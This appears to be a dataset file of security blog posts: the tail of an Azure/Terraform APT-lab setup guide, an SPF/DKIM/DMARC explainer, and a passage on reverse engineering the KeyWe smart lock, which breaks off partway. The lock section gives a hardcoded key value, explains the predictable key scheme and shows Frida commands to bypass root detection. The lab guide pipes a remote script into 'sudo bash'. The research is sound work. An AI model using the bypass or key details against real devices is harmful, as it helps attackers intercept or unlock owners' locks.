$5/month\n\nStep 2 \n\nInstall AZCLI\n\ncurl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash\n\nStep 3\n\nGather up the terraform binaries, unpack, and add to PATH. An old habit I learned from a fella named Fletch was to add packages and tools to /opt/. Also, be careful, binary locations change over time. Grab the latest terraform package location here: https://www.terraform.io/downloads.html\n\ncd /opt/\n\nwget https://releases.hashicorp.com/terraform/0.12.29/terraform_0.12.29_linux_amd64.zip\n\nUnzip terraform_0.12.29_linux_amd64.zip\n\nmv terraform /usr/local/bin/\n\nTerraform should now be operational! \n\nterraform -v\n\nStep 4\n\nThis step is a bit more complicated and is likely to cause some trouble on the path to deployment. We need to gather the necessary token information to authenticate via AZCLI to our Azure subscriptions. \n\naz login\n\nThis command should prompt us for authentication on the AZ cloud. I simply accessed an existing Azure session and followed the instructions. \n\nThe next command is used to set your authenticated AZ CLI session to the appropriate subscription.\n\naz account set --subscription=\"YOUR_SUBSCRIPTION_ID\"\n\nThe next command will create a service principal with role-based access controls for this deployment.\n\naz ad sp create-for-rbac --role=\"Contributor\" --scopes=\"/subscriptions/YOUR_SUBSCRIPTION_ID\"\n\nThis command will output some sensitive information, as indicated by zeroes in the following screenshot, which was lifted from a Microsoft article linked as a reference. Each of these values will be inserted into your LabBuilder.py script. \n\n(appId is the client_id)\n\n(password is the client_secret)\n\n(tenant is the tenant_id)\n\nStep 5\n\nGather the repo and configure the LabBuilder script for your subscription and service principal.\n\ngit clone https://github.com/DefensiveOrigins/APT-Lab-Terraform.git\n\ncd APT-Lab-Terraform\n\nvi/vim/nano/emacs/word/textpad/mousepad/leafpad/notepad/ LabBuilder.py\n\nStep 6\n\nBuild! \n\npython3 LabBuilder.py -m \n\nRight now, I am guessing a complete build will be done in 27 minutes. \n\nThis build finished in a modest 23 minutes, 53.8 seconds. \n\nThe output as shown is just a public IP address from Microsoft\u2019s allocations. That address has a listening remote desktop service available to the labs.local\\itadmin user. The password is \u201cAPTClass!\u201d no quotes. Please recognize that at this point, the optics stack is unconfigured (you will not see a thing in Elastic, no Sysmon is installed, nada). \n\nA fantastic description of the code base itself, all the underlying systems, services, users, etc is available on the git repo. A high level overview of the lab environment at this point is listed below. This information is also documented on the git repo. \n\nWindows DC: 10.10.98.10\n\nPublic IP restricted to the provided public IP will land on the Windows member system.\n\nWindows WS: 10.10.98.14\n\nHELK: 10.10.98.20 \n\nKafka on 9092, etc\n\nLogstash on 5044\n\nElastic on 443\n\nSSH on 22\n\nIn our experience, this lab runs between six and eight bucks a day ($6.00 - $8.00 / day) on Azure (AWS is more than twice this cost in testing thus far). Which, for newcomers to Azure, you are eligible for $200 in credits. \n\nSome useful links: \n\nhttps://github.com/DefensiveOrigins/APT-Lab-Terraform\n\nhttps://github.com/Cyb3rWard0g/HELK\n\nhttps://defensiveorigins.com\n\nhttps://www.terraform.io/downloads.html\n\nhttps://www.terraform.io/docs/providers/azurerm/guides/service_principal_client_secret.html\n\nNext up: using two individual scripts to install the entire Windows optics stack and ship logs. Once you run these scripts, the listening Apache Kafka broker will do its thing and you will start seeing log data in Elastic. This will get turned loose in the same repo. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How SPF, DKIM, and DMARC Authentication Works to Increase Inbox Penetration (Testing) Rates\"\nTaxonomies: \"Author, Fun & Games, How-To, Informational, InfoSec 101, Kent Ickler, Kent Ickler\"\nCreation Date: \"Wed, 19 Aug 2020 12:05:00 +0000\"\nKent Ickler //\n\nTL;DR Want a quick fix? \n\nAlmost every marketing platform we\u2019ve seen has decent tutorials on authorizing outbound email with SPF and DKIM authorization.\n\nSalesforce: https://help.salesforce.com/articleView?id=000315520&language=en_US\n\nSendGrid: https://sendgrid.com/docs/glossary/spf/\n\nMailChimp: https://mailchimp.com/help/set-up-custom-domain-authentication-dkim-and-spf/\n\nMailGun: https://mxtoolbox.com/c/outboundemailsources?public=Mailgun\n\nAmazon SES: https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-spf.html\n\nConstant Contact: https://knowledgebase.constantcontact.com/articles/KnowledgeBase/34717-SPF-Self-Publishing-for-Email-Authentication?lang=en_US\n\nIf you\u2019re a marketing arm of your organization or are a mass marketing company and cherish the absolute brilliance of Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting and Conformance (DMARC): stop now.  This isn\u2019t for you.  You already know what I have to say.\n\nBottom line:\n\nThis is subject to individual server configuration, but generally speaking, the more you can prove to a recipient mailserver that an email is valid, authorized, and intended, the more likely it is to reach an inbox.  \n\nIf you don\u2019t know what I just said, prepare for a ride:  \n\nYour mass marketing emails are hitting my inbox not because you bypassed our spam discernment, but because our clients' mailservers are sometimes misconfigured and we don\u2019t want to miss an important email from our customers.  At BHIS, some emails that otherwise would go to spam get sent into our inbox and \u201ctagged\u201d to remind our staff that extra scrutiny is warranted because something is amiss and we are calling the email\u2019s origin into suspicion. \n\nDisclaimer: \n\nThis blog uses the words \u201cAuthenticated\u201d, \u201cAuthorized\u201d, and \u201cVetted\u201d somewhat loosely to represent the process and outcomes related to SPF, DKIM, and DMARC validation.  In this context the definitions are analogous and don\u2019t align to how InfoSec would typically define them. Assume unauthenticated, unauthorized, unvetted, untrusted is not preferred.\n\nLet's Talk about email Authorization.\n\nBack in the day, email was just trusted by everyone.  Remember when it was fun to send email from president@whitehouse.gov?  Well... nevermind.\n\nDo Hackers Phish?\n\nYes, hackers phish.\n\nThese days email has a problem: big-spam, phishing, malice, tom-foolery, etc. The consequence of the untrustworthiness of bad-intention is that today\u2019s\u2019 email services have migrated to a new default expectation that email should be vetted prior to delivery.  This is a good trend too, but it means emails now need to provide more information about how they were sent to prove their intent and authorization.\n\nA new norm:\n\nUntrusted email is not trustworthy.\n\nOr \n\nUnauthorized email is not authorized.\n\nOr\u2026\n\nCredentials please...\n\nWe\u2019re not saying that unauthenticated, unvetted email disappears into oblivion. We are however saying that the authorization and providence an email can deliver itself with will increase its likelihood of successful delivery.\n\nIt's become important for mail providers to provide a service that protects their end users from various bad-intent threats.  Not all emails are threats, but some are.  Distinguishing between them can be difficult even for humans. Protocols exist that can allow mail servers to validate the authenticity and authorization of email during delivery.  Email platforms have come to rely on those protocols for spam discernment, and it's a good thing.  \n\nIn days past, it was less important for mass-marketing to worry about intent, authorization, or validation.  Emails would all deliver just fine.  Today:, not so.  Between threat intel feeds, deny-lists, and massive spam operations, marketers need a way to ensure they can inform delivery servers that their email isn\u2019t spam, even if the email contains trigger words like \u201cdeposit\u201d, \u201caccount number\u201d, or \u201cJunior Financial Secretary to the King of Algeria\u201d.\n\nThis is where SPF, DKIM, and DMARC come into play.  SPF and DKIM platforms provide a mechanism for the registrant (Domain Administrator) of a domain to authorize (trust/authorize) which email servers are allowed to send email indicating their domain name in email headers (such as the From email address).  Additionally DMARC provides methods for enforcing SPF and DKIM and a mechanism for reporting compliance metrics and logging of authorized email activity.\n\nSender Policy Framework (SPF)\n\nSender Policy Framework (SPF), consists of a DNS record that an administrator can add to their domain\u2019s zone file, and a protocol that instructs a recipient mail server to validate the originating mail server\u2019s authorization to use the indicated domain name.\n\nWe\u2019ve talked about this before:\n\nHow to Configure SPFv1 for The Masses [https://www.blackhillsinfosec.com/how-to-configure-spfv1-explained-for-the-masses/]\n\nAutomating Anti-Phishing Recon using SPF: https://www.blackhillsinfosec.com/offensive-spf-how-to-automate-anti-phishing-reconnaissance-using-sender-policy-framework/\n\nDeep Dive:\n\nRFC 4408 [https://tools.ietf.org/html/rfc4408] (obsolete)\n\nRFC 6652 [https://tools.ietf.org/html/rfc6652]\n\nRFC 7208 [https://tools.ietf.org/html/rfc7208] \n\nDomainKey Identified Mail (DKIM)  \n\nDKIM is a public key infrastructure that includes two keys.  The first key is entered in the domain name zone file for public access.  This key is then referenced by name in outbound emails by mail servers.  The second key (private) is stored on the email server and used to cryptographically sign hash computations of the email\u2019s various components. \n\nDKIM compliant emails include a mail-header (meta-data) that provide the DKIM private key\u2019s matching public key name, the email\u2019s computed hash, the cryptographically signed hash, and instructions to process validate the signed hash.  The comparison of email hash and validation of crytophraphicaly signed hash determines the emails\u2019 DKIM validation.\n\nDeep Dive\n\nRFC 6376 - DKIM: https://www.ietf.org/rfc/rfc6376.txt\n\nDomain-based Message Authentication, Reporting and Conformance (DMARC)\n\nDMARC  is a protocol that instructs recipient mail servers what to do if SPF and DKIM are absent or invalid.  DMARC also provides a method for recipient mail servers to report to the indicated domain owner about current email trends, including potential malicious activity.  This can effectively close the gap of an adversary sending unauthorized emails without the knowledge of the domain owner.\n\nDeep Dive:\n\nDmarc Technical Specifications: https://dmarc.org/resources/specification/\n\nRFC 7489 DMARC: https://tools.ietf.org/html/rfc7489\n\nRFC 8553 Supporting DNS Changes: https://tools.ietf.org/html/rfc8553\n\nRFC 7960 Interoperability of DMARC: https://tools.ietf.org/html/rfc7960\n\nRFC 6591 Failure Reporting Format: https://tools.ietf.org/html/rfc6591\n\nRFC 8601 Message Header Field for Authentication: https://tools.ietf.org/html/rfc7601\n\nOk, so what's the deal?\n\nIf you\u2019re using a mass-email platform and you didn\u2019t go through the effort to authorize that email platform with SPF, DKIM, and create a ruleset in DMARC, the entirety of the inbox penetration rates will depend not on your marketing efforts, but on the configuration of the recipient mail servers to handle \u201cunauthorized\u201d email.  Unvetted email is, in fact, unvetted...   If you\u2019ve spent the money to make an effective email campaign, Be sure you spent the time to ensure it will hit inboxes.\n\nMarketeering hot tip:\n\nSetup SPF, DKIM, and DMARC.\n\nIt will take you less than a half hour to do and your inbox penetration rate will go up.\n\nWhat!? You want a Demo?\n\nOK.\n\nThe Pathology of Email Authorization Validation\n\nHere, I\u2019ve sent an email from my BlackHillsInfoSec.com email address to my DefensiveOrigins.com email account.  On my Defensive Origins account, I have opened the full source of the email that includes the specific mail headers that have been appended by the various origin, transport, and destination mail servers.  \n\nAs Sent: \n\nAs Received: \n\nThe email headers that were included in the received email are where we start investigating how the email validation process played out.  Let's start with SPF.\n\nSender Policy Framework Autopsy\n\nSPF was around before DKIM.  It's not absolute that a recipient mail server will first check SPF records, but it's fair to assume that most recipient mail servers will validate a mail server for authorization according to SPF standards.  Let's look at the email I sent myself.\n\nRemember, this email is coming from blackhillsinfosec.com.\n\nWe can check BlackHillsInfoSec.com\u2019s SPF record using MXToolbox or by querying DNS ourselves.  We will run the DNS query in a moment, but let's check out MXToolbox\u2019s ability to quickly decode the SPF syntax into common language.  MXToolbox is a great tool for quickly reading SPF records. \n\nThe important bit here is the SPF include:_spf.google.com method in Black Hills\u2019 SPF record.  The include method instructs the recipient mail server to query the SPF record of _spf.google.com and include it in the SPF record of blackhillsinfosec.com.   As we will see in a moment, the _spf.google.com record also has inclusions of more SPF records. Always take great care when adding an include method in an SPF record, you may be authorizing more than you think.  The list can grow pretty quick. \n\nThe domain administrator of BlackHillsInfoSec.com expects (SPF authorizes, via DNS record) mail indicating blackhillsinfosec.com to be originated from the associated Google mail servers.  Did I mention that BlackHillsInfosec.com uses GSuite (Google Suite)?\n\nIn the email received by my DefensiveOrigins account, the recipient mail server has included information about the email server that originated the email.  The header below indicates the email was originated by the mail server referenced as mail-ed1-f53.google.com.\n\nWith a few DNS queries, we can track down if this is SPF validated for BlackHillsInfoSec.com according to the BlackHillsInfoSec.com SPF record.\n\nThe use of the include SPF method was used to validate the originating Google email server.  We manually validated that the email was sent via an SPF authorized server using \u201cnslookup\u201d.  The Defensive Origins mail server came to the same conclusion and documented the authorization result in an appended mail header in the received email named Received-SPF.  This header is defined in RFC 7208 [https://tools.ietf.org/html/rfc7208].\n\nThe recipient mail server also included a summary of the various validation checks in the mail header named \u201cAuthentication-Results\u201d.  This is a summary of the authentication process. This header is defined in RFC 7601[https://tools.ietf.org/html/rfc7601] (made obsolete by RFC 8601[https://tools.ietf.org/html/rfc8601])\n\nCongrats: \n\nSPF VALIDATION ACHIEVEMENT BADGE\n\nNext up: Public Key Infrastructure and email authorization.\n\nDKIM Signing Validation\n\nBlack Hills also has DKIM validation that authorizes mail servers by use of cryptographic signatures of (portions of) the contents of emails.  This allows recipient mail servers to validate specific email headers and email body content has not been tampered and verify email is authorized by the Domain Administrators of BlackHillsInfosec.com.\n\nDKIM\u2019s use of Public Key Infrastructure (PKI).\n\nMail administrators create a DKIM compliant key pair. A key (private) is stored on the email server and used to cryptographically sign computed hashes of specific email components.   The public key is posted in public DNS in a special subdomain of the indicated domain name.  It is not good practice to re-use keys-pairs for multiple servers. DKIM allows for use of multiple key-pairs.\n\nWhen emails are sent with DKIM signing, the originating email server will include an email header that indicates which DNS DKIM public key to validate the email\u2019s cryptographically signed hashes.  The selection of the DKIM public key is called the \u201cselector\u201d.   The selector instructs the recipient mail server which DNS record to query to obtain the DKIM public key. The DKIM public key is procured by a  DNS TXT query of [selector]._domainkey.domain.tld.  The public key found on the DNS TXT record is used to validate the cryptographic signature included in the DKIM authorized email header.  The comparison of the computed email hash and validation of the cryptographic signature determines if the email is DKIM authorized.\n\nIn the email I sent from BlackHillsInfosec.com, the originating email server had included the DKIM-Signature mail header.  This header is defined in RFC 6376 [https://tools.ietf.org/html/rfc6376] and includes the cryptographically signed hash as well as instructions for the recipient mail server to create the hash and validate the signature.\n\nThe above email header indicates that we are using:\n\nv=1 Version one of DKIM protocol\n\na= Hash Algorithm\n\nc= Hash input method (accounts for header modification in transit)\n\ns= Public Key selector \n\nh= Headers that have been signed in b= \n\nbh = hash of body part(s) (according to \u201cc=\u201d) [base64]\n\nb= Cryptographically signed hash of body/headers \n\nThe originating email server used its DKIM private key to cryptographically sign the hash values for the body (bh=[hash]) and store the signed hash (b=hash/signature).  This process is detailed in RFC-6376 Section 3.7 but ultimately the output is a signature that can be validated with the DKIM public key.  \n\nUpon the recipient email server analyzing the DKIM mail header it began its DKIM validation process. It used the information from parameters \u201ca=\u201d, \u201cc\u201d, \u201cand \u201ch=\u201d to compute a hash of the email components.  The hash was then compared to the value provided in parameter \u201cbh\u201d.  If the hashes matched, the validation process continued.  If the hashes did not match, the DKIM validation has failed.\n\nThe recipient mail server then queried DNS to retrieve the DKIM public key by using the indicated domain and selector specified in the DKIM header.\n\nd=blackhillsinfosec.com\n\ns=google\n\n[CODE]\n# dig google._domainkey.blackhillsinfosec.com txt\n; <<>> DiG 9.11.3 <<>> google._domainkey.blackhillsinfosec.com txt\n;; ANSWER SECTION:\ngoogle._domainkey.blackhillsinfosec.com. 1800 IN TXT \"v=DKIM1; k=rsa; \np=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBi  \nQKBgQCVxOyLCpVSrOzHZxkQciLBVhOkDYeMoM0A9A/NVUERAgXA7HDnP8c63tCrq8aKOv\nKwcTAXF1EV+BSNQcneCmG/QX9oWPuTBvkX2J        \nwG0oRt/oP155KcJBbdczO9mmOwnFxTgiIiuF6oYT92cvcNT6zUh4QtvFmypMkIGrEZeGF9oQI\nDAQAB\"\n[/CODE]\n\nThe server then validated the signed hash (=b) using the DKIM public key. The cryptographic signature is validated using the public-key and the email is considered DKIM authorized.  If the signed hash could not be validated or the public key could not be retrieved, the email would have failed DKIM authorized. \n\nAfter the DKIM validation process, the recipient mail server included in DKIM validation results in the Authentication-Results header. \n\nCongrats!\n\nDKIM VALIDATION ACHIEVEMENT.\n\nAt this point in validation, we have confirmed that the email was sent via an SPF authorized email system and that the email used DKIM signatures to validate delivery and specific unmodified content between the originating mail server, the transport server, and the delivery server.  But, what happened if that wasn\u2019t the case?  That's where DMARC comes in!\n\nQuestion Time!\n\nWhat happens if an email includes a DKIM signature but fails DKIM validation?  \n\nWhat happens if SPF authenticates an email server, but the DKIM signature was missing?  \n\nWhat if the DKIM signature is validated, but SPF indicates the mail server wasn\u2019t authorized?  \n\nCan an administrator be notified if someone is sending authorized email?\n\nCan an administrator be notified if someone is sending unauthorized email?\n\nAll of these questions and related problems are solved by the use of DMARC.  Much like SPF and DKIM, DMARC is a DNS TXT record assigned to the domain zone file of an indicated email domain.  The DMARC record instructs recipient mail servers how received email should be processed based on the results of the SPF and DKIM protocols and additional instructions to create a feedback loop notifying an administrator of the indicated domain\u2019s email use.\n\nOur example email was sent from BlackHillsInfosec.com.  The recipient mail server queried the BlackHillsInfoSec.com domain for its DMARC DNS record.  The DNS record instructed the recipient mail server how to process the email based on its SPF and DKIM results.\n\nThe DMARC DNS record is assigned to a special subdomain named _dmarc.  In our case the recipient mail server queried TXT record for _dmarc.blackhillsinfosec.com.\n\n[CODE]\nC:\\>nslookup -type=txt _dmarc.blackhillsinfosec.com\nNon-authoritative answer:\n_dmarc.blackhillsinfosec.com    text =\n\n    \"v=DMARC1; p=none; rua=mailto:dmarc_reports@blackhillsinfosec.com;\nruf=mailto:dmarc_forensic@blackhillsinfosec.com; fo=1\"\n[/CODE]\n\nThe BHIS Dmarc record above instructs mail servers that the txt record is a valid DMARC txt record.  The BHIS record instructs the recipient mail server to process the email according to this DMARC configuration:\n\nv=DMARC1 DMVARC v1 valid TXT record\n\np= none if email fails validation, do nothing additional\n\nRua = Send aggregate mail data o dmarc_reports@blackhillsinfosec.com\n\nRuf = Send failure forensic reports to dmarc_forensic@blackhillsinfosec.com\n\nfo=1 Send forensic upon SPF or DKIM not-pass\n\nThe email having been successfully SPF and DKIM validated is processed according to the DMARC ruleset and is delivered to the intended recipient. However, not without being part of an aggregate report sent in compliance with the DMARC record.\n\nCongrats!\n\nDMARC VALIDATION BADGE!\n\nAbout those DMARC reports\n\nYou might be asking a question:\n\nJust how many emails go to those notification addresses we specified in the DMARC record?  Well, in regards to DMARC compliant mail servers, we get:\n\n1 aggregate email per recipient-mail-server per indicated-domain per day\n\n1 forensic report per unauthorized email delivery.\n\nThe math here is effectively the number of domains that BHIS sends email to on a daily basis + emails that BHIS doesn\u2019t send to domains that received email indicating BHIS as the origin domain + forensic reports of authorized email.  It's worth noting that not all recipient mail servers send forensic reports of unauthorized email, but typically will include the failure result in its aggregate report email.\n\nYou might be thinking\u2026 isn\u2019t that a lot of emails about emails?  You guys actually read those?\n\nYes, kinda. It is a huge amount of emails that we never read. It\u2019s all automated.  \n\nMore on that next time when we ask  \u201cHey, what's that spike of invalid mails sent?\u201d\n\nAll in all, that's a long story short about a 1 line email.\n\nNow, get those emails in my inbox (without getting tagged) and start making money :)\n\nPost-Blog Banter: Why this blog exists\n\nEvery day I get emails from various companies from industries trying to sell their products.  At BHIS we\u2019ve grown accustomed to non-traditional marketing, focusing on client and community relationships over mass-emails.  But we\u2019re not dogging-- we don\u2019t run our business like others -- our atypical strategies aren\u2019t for everyone and they don\u2019t come without its own type of painful stories and problems.  \n\nTraditional marketing is still important and when we see our competitors (friends, actually) making a potential pricey misstep, we want to help.  \n\nAt BHIS, we have a mantra: \u201cProudly Sucking at Capitalism.\u201d  \n\nSometimes doing the RIGHT thing isn\u2019t profitable, at all.  \n\nThis blog is probably one of those cases. It certainly didn\u2019t take five minutes to write this blog, editors were assigned, peer-reviewers recommended modifications,  someone fixed my tYpos, someone uploaded and published it, and someone else may have notified you.  Helping our competitors' (friends\u2019) marketing endeavors probably isn\u2019t in the best interest of the BHIS\u2019 bottom line, but it is in our other interests:  We seriously do want to make it (the world) better, and if helping you get your valid idea out there helps\u2026 well\u2026 good.  \n\nFranky, I\u2019m saddened that I\u2019ve grown fatigued by the number of emails for X product or Y service that we \u201cTag\u201d as being \u201csuspicious\u201d not on merit of the product or service, but merely on the fact the marketing campaign sent emails that were considered unauthorized.  The result can be costly.  Our visibility in the lack of authorization is not why we built the email-tagging system, it's just a by-product.  In fact, if we didn\u2019t have that tagging system, I wouldn\u2019t even know I received the email because it would have hit the spam black hole never to be seen except when hunting for an unrelated missing email.\n\nMake your ideas heard.  Make the world a better place.  \n\nGo forth and do good things.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Reverse Engineering a Smart Lock\"\nTaxonomies: \"Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch\"\nCreation Date: \"Thu, 27 Aug 2020 12:15:00 +0000\"\nRay Felch //\n\nINTRODUCTION\n\nRecently I was afforded the opportunity to research the findings of a well-known security firm (F-Secure), who had discovered a vulnerability in the Guardtec KeyWe Smart Lock. The F-Secure people found that due to a design flaw, an attacker could intercept and decrypt traffic coming from a legitimate owner of the lock. I found their blog (posted in December of 2019) to be extremely fascinating and very informative. I soon became motivated to see if I could duplicate their efforts, realizing that F-Secure had issued an advisory and that the vendor had been given an opportunity to mitigate their exposure. Unfortunately, their mitigation options were extremely limited due to the fact that they had no firmware update functionality. Instead, they chose to use obfuscation in their android app in an attempt to hide the more relevant sections of code (which they did quite well I might add).\n\nAlthough F-Secure had laid the groundwork, they were careful not to reveal too much information and even REDACTED some of their own tools, thereby retaining the 'keys to the kingdom' as they put it. During my journey, I found myself constantly going back to their blogs, especially as I discovered new and relevant information of my own. This blog is intended to, not only consolidate my notes and document my research but to maybe inform others of some pretty cool tools and methods for reverse engineering Android/iOS applications.\n\nAfter receiving the shipment of my KeyWe Smart Lock and creating a test fixture to mount it, I downloaded the android app to my mobile phone and created my account. I got familiar with the functionality of the lock and the look and feel of the mobile app. I also ran my Nordic nRF Connect mobile app (available for free on Google Play store) to gain useful information about my lock, such as the Bluetooth address, primary service UUIDs, characteristics, etc. Note: Understanding Bluetooth Low Energy GATT and GAP is beyond the scope of this write-up, however, the BLE specifications are easily accessible here https://www.bluetooth.com/specifications/, should you want to read up.\n\nUSEFUL INFORMATION\n\nCommunications between the KeyWe (lock) and the (mobile) App are transported via Bluetooth Low Energy (BLE) packets, which are encrypted using the standard ECB AES-128 cipher in order to prevent third-party eavesdropping. The security of the message channel is based solely upon 3 secret keys used for the encrypting and decrypting of the OTA (over-the-air) AES-128 packets.\n\nCommon Key (CommonKey) used for the initial key exchange\n\nApp Key  (AppKey) used to encrypt packets sent by the App to the Door\n\nDoor Key (DoorKey) used to encrypt packets sent by the Door to the App\n\nKEY GENERATION\n\nThe CommonKey is based entirely on a static 16-byte value which is simply enumerated with the last 5 bytes of the device's Bluetooth address as follows:\n\nUpon further examination of the CommonKey on multiple KeyWe devices, it appears the only difference between all devices examined were the last two bytes of the device Bluetooth address! In my case, the values 4C and 93 were unique to my device. This suggests that the CommonKey is highly predictable and based solely on two bytes within a 16-byte static value per device!\n\nThe AppKey and DoorKey are created from two algorithms (and heavily obfuscated) methods makeAppKey and makeDoorKey. The F-Secure people created a nice tool that generates the three secret keys by simulating the action of these two methods (although they REDACTED and obfuscated their work, rendering it generally harmless). After some considerable time, however, I was able to reverse engineer the functionality of these two methods myself working with a handy open-source tool called Frida (more on this later).\n\nAppKey and DoorKey creation consists of passing two arguments to the makeAppKey and makeDoorKey functions. These two arguments are AppNumber and DoorNumber respectively.\n\nAppNumber is a static (hard-coded) 12-byte value (padded with four zero bytes):  92 4b 03 5f bd a5 6a e5 ef 0e d0 5a 00 00 00 00   Note: AppNumber is encrypted with the CommonKey and sent to the Door (lock) as the very first packet transmission of the user session, thereby initiating commencement of the session.\n\nDoorNumber is a dynamic (changes every new session) 12-byte value (padded with four zero bytes) generated by the Door (lock). This value (also encrypted with the CommonKey) is sent to the App, in response to receiving the AppNumber.  (see diagram below)\n\nNote: These two 'opening' transmissions (AppNumber and DoorNumber) complete the initial key exchange process and allow for the creation of the AppKey and DoorKey which will afford secure OTA communications between the App and Door going forward.\n\nNow that the AppNumber and DoorNumber have been created and exchanged, we have the two components required for generating the remaining two secret keys (AppKey and DoorKey). This is accomplished by calling the makeAppKey and makeDoorKey functions with AppNumber and DoorNumber as arguments. This is done internally within the firmware and not sent OTA.\n\nAPPLICATION FLOW DIAGRAM\n\nNow that we have generated and exchanged AppKey and DoorKey, each side can now encrypt/decrypt packets sent or received. All packets transmitted by the App will be encrypted using the AppKey and all packets transmitted by the Door will be encrypted using the DoorKey. Both sides know each other\u2019s encryption scheme and can, therefore, decrypt the packet.\n\nThe following diagram demonstrates the order of events of a typical user session:\n\nIt should be noted that all of these packets are transmitted OTA at the beginning of every user session, and all 13 of these packets are encrypted with either the AppKey or the DoorKey depending upon the transport direction.\n\nREVERSING THE ANDROID APK\n\nAll mobile applications are downloaded as APK (Android Application Package) files. APK files are saved in ZIP format and are typically downloaded directly to Android devices, usually by way of the Google Play store, but can also be found on other websites. When reverse engineering android APKs, I find that it is often helpful to use third party sites to search for older versions of the APK in question.  A favorite of mine is https://apkpure.com/.\n\nSoftware Requirements\n\nJava version 1.8.0_251\n\nADB (android debug bridge) version 1.0.41\n\nAPKStudio (wrapper for Apktool) version 2.4.1\n\nDex2Jar version \n\nJadx version 1.1.0\n\nFrida version 12.8.9\n\nHardware Requirement\n\nRooted android phone\n\nA typical APK contains some very useful content, such as an AndroidManifest.xml, classes.dex, and resource.arsc file; as well as a Meta-INF and res folder. There are a few different ways to open an APK residing on your PC. Obviously, because it is a ZIP file, any of the various UNZIP extractors will work just fine, however using tools like Dex2Jar, Apktool, and Jadx (to name a few) offer additional advantages such as converting .dex files to java code for better readability and GUI support for ease of navigating the code.\n\nDEX files (Dalvik executable files) are developer files used to initialize and execute applications for the Android mobile platform. Tools like Apktool can decompile the DEX (machine language) files into Smali (assembly language source) files. We can also use tools like dex2jar to convert DEX files to JAR (java) files and use jadx GUI to open the JAR file as java source code.  Java source code can be a lot easier to read than Smali source. There are many options available to navigate the Android APK, including a favorite of mine, APKStudio.\n\nWith the many options available, it would be beyond the scope of this write-up to describe the various steps involved with implementing any one of these tools. I would suggest downloading them and experimenting with several techniques to find your best fit. There are plenty of helpful tutorials out there.\n\nUSING FRIDA \n\nThe F-Secure researchers stated in their blog that they were able to intercept function calls in the android app using a tool called Frida. I was not aware of this tool, so I decided to check it out. This tool is amazing! Understanding how to implement Frida is beyond the scope of this write-up. However, suffice to say, Frida allows a researcher the ability to attach to existing functions within an application and dynamically dump the arguments and return values. This is most definitely worth checking out! https://frida.re/docs/home/\n\nFrida w/toolkit installation\n\npip install frida\n\npip install frida-tools\n\nRequirements:\n\nfrida-server and adb (android debug bridge)\n\nrooted android phone for debugging apk (I used an old Samsung GS5)\n\nInstall frida-server on rooted phone\n\nTo install the server, navigate to https://github.com/frida/frida/releases and download the appropriate file for the specific phone platform being used.\n\n(If you are not sure of the phone's architecture, download and run Droid Hardware Info (from Google Play store)\n\nCopy the downloaded file to your project directory\n\nNavigate to your project directory\n\nUnzip the .xz file with : xz -d -k frida-server-12.9.8-android-arm.xz\n\nUsing adb (android debug bridge) tool push the extracted file to the rooted phone:\n\nINITIAL SETUP: (installs frida-server on rooted phone)\n\n$ adb push frida-server-12.9.4-android-arm /data/local/tmp\n\n$ adb shell     ### shell into phone\n\n$ su                                    ### root level user\n\n# cd /data/local/tmp\n\n# chmod 777 frida-server\n\n# ./frida-server &               ### start frida-server daemon\n\nOnce the frida-server is installed on the rooted phone, begin a new session as follows:\n\n$ adb shell\n\n$ su\n\n# cd /data/local/tmp\n\n# ./frida-server &\n\nInitially, I had a difficult time coordinating the learning of a new tool (Frida), with the added burden of trying to find the same function calls that the F-Secure people referenced in their blogs. Due to the F-Secure advisory, the vendor heavily obfuscated the latest releases, meaning no more 'makeAppKey' or \u2018makeDoorKey' functions to attach to. I also discovered that the vendor incorporated security measures to prevent running the KeyWe application on rooted phones. The F-Secure researchers created a cool tool using python and a Frida javascript to attach to the offending method and injected java code to always return false to 'isRooted'.\n\nUnfortunately, due to the heavy obfuscation of my newer version of the Android APK, the 'RootTool' class did not exist and I was forced to search my APK code in an attempt to find it's equivalent class. After a considerable amount of time searching the code, I eventually located the root check methods.  It turned out the 'RootTool' class was now referenced as 'n', and the 'iSRooted' function is now referenced as function 'b'.\n\nModified F-Secure's KeyWe-Tooling script according to my search findings\n\nResulted in successfully evading the root detection!\n\nMoving along, I determined that working with the latest release of the android application was more trouble than it was worth. The obfuscation was immense and becoming extremely tedious and frustrating trying to find functions whose names had been changed to a single letter. Fortunately, about this time, a colleague provided me with a link to some older KeyWe android APK's https://apkpure.com/keywe-for-a-smarter-life/com.guardtec.keywe/versions. This turned out to be a great find, as now I could snag a version just prior to the advisory, with all referenced functions still intact. I proved this by returning to the original (unmodified) version of the F-Secure root-evasion script and it worked! Also, I learned that their 'trace_java_functions' tool now worked as well, providing me with an enormous amount of definitive data to work with. \n\nIn the following Frida hexdump example, we can see the call being made to the AES-128 cipher function (generated by the App) passing two byte_array arguments (AppNumber, CommonKey). This is clearly encrypting the AppNumber with the CommonKey for the OTA packet transmission to the Door, starting the session sequence of events.\n\nLikewise, this example also shows another call being made to the AES-128 cipher function, passing the arguments (DoorNumber, CommonKey), to encrypt the DoorNumber for OTA transmission to the App.\n\nLastly, from this example, Frida allows us to see the arguments passed and the return values of the two internal function calls that generate the AppKey and DoorKey.\n\nBased upon many Frida sessions captured and the deciphering of the data, I soon became very familiar with the KeyWe application and had a good understanding of how and where the important keys were generated, as well as the sequence of events on start-up. In addition, I learned that during an active session, the status of the door is constantly monitored and updated by information exchanged between the App and the Door. My sessions included signing in, unlocking, and locking the Door using the App on my phone.\n\nF-Secure Frida java scripts:\n\nEvade root-detection:  disable_root_detection.js\n\nTrace injected java functions:  trace_java_functions.js  (original)\n\nSession includes:\n\nSign-in, wait for connection and for LOCKED (red) status\n\nClick to UNLOCK, wait a few seconds, click to LOCK, wait a few seconds\n\nClick to UNLOCK, wait for auto-LOCK, disconnect\n\nC:\\Users\\rayfe\\keywe-tooling\\frida>start_root.py                                                                         \n\nC:\\Users\\rayfe\\keywe-tooling\\frida>keywe_inject.py trace_java_functions.js\n\n BTSNOOP (Android Bluetooth HCI logger)\n\nUltimately, BTSNOOP has to be one of my greatest finds when wanting to capture a complete Bluetooth session between central (phone) and peripheral (lock), I attempted various methods to capture my OTA Bluetooth sessions, including Nordic's nRF Sniffer development board 